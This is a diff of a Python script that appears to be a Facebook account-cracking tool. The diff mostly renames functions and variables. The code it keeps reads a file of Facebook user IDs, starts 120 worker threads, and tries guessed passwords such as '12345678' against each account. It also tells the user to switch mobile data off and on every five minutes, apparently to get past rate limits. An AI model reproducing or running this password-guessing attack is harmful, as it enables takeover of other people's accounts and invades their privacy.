@@ -53,7 +53,7 @@ def main():
     os.system("clear")
     print(lxgo)
     if gxdsoption1 in ["GXDS", "gxds"]:
-        file_iclone()
+        gxdsclone()
     elif gxdsoption1 in ["1"]:
         print(gxdsprnt)
         print(lxgo)
@@ -72,7 +72,7 @@ def main():
         time.sleep(3)
         main()
 
-def file_iclone():
+def gxdsclone():
     print(gxdsprnt)
     fl = input(
         "\033[1;97m  [-] INPUT YOUR OWN FB IDS FILE TO START CRACKING.\n  \033[1;33m[•] FILE PATH: "
@@ -81,18 +81,18 @@ def file_iclone():
     print(lxgo)
     print(gxdsprnt)
     try:
-        fileeee=open(fl,"r").read().splitlines()
+        gxdsfiles1=open(fl,"r").read().splitlines()
     except:
         print("\033[1;91m  [X] FILE NOT FOUND.")
         print(gxdsprnt)
         time.sleep(3)
         main()
-    auto_pass(fileeee)
+    gxdsfiles(gxdsfiles1)
 
 
 
-def auto_pass(fileeee):
-    tl=str(len(fileeee))
+def gxdsfiles(gxdsfiles1):
+    tl=str(len(gxdsfiles1))
     print("  \033[38;5;46m========================================")
     print(
         "\033[1;31m  [-] TIP: ON/OFF THE DATA EVERY 5 MINUTES\n           TO SPEED UP THE PROCESS. \n"
@@ -107,7 +107,7 @@ def auto_pass(fileeee):
     print("  \033[38;5;46m========================================")
     print(gxdsprnt)
     with ThreadPool (max_workers=120) as feel:
-        for data in fileeee:
+        for data in gxdsfiles1:
             uid=data.split("|")[0]
             pwx=[]
             pwx.append("12345678")
